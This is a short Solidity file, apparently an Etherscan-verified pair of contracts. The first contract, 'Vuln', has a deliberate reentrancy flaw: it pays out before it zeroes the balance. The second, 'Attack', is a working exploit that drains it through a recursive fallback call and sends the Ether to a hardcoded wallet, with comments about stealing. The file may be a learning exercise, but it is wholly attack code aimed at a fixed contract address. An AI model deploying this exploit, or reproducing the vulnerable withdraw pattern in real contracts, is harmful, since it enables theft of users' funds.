/**
 *Submitted for verification at Etherscan.io on 2021-12-01
*/

// My contract address: 0xA051F0befb8e938FCa84D29fB233e45911f944f3
pragma solidity ^0.5.0;

//REMOVE LATER 
contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])(""); //money is sent back to contract as well as be handled be in the callback function

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
} 

contract Attack {
    Vuln vulnInstance = Vuln(address(0x36A540E3A78084962B75E25877CfACf8846Be018)); //Address of contract 
    address owner;

    bool stealLoop = true; 

    constructor() public {
        owner = msg.sender;
        stealLoop = true;
    }

    function attackDeposit() public payable{
        require(msg.value > .00001 ether); //require user sends some ethereum
        vulnInstance.deposit.value(msg.value)();
        // vulnInstance.deposit({value: msg.value});
        stealLoop = true;
        vulnInstance.withdraw();
    }

    function () external payable {
        //send the withdrawn money to my wallet
        address payable myWallet = address(0x707e5b82B00ea0138C7a0e3cb0152314f5E77FA6);
        myWallet.transfer(msg.value);
        //do something with send return
        
        if(stealLoop == true){ //desired money to steal 
            stealLoop = false;
            vulnInstance.withdraw();
        }

    } //fallback pay function if payed? 


}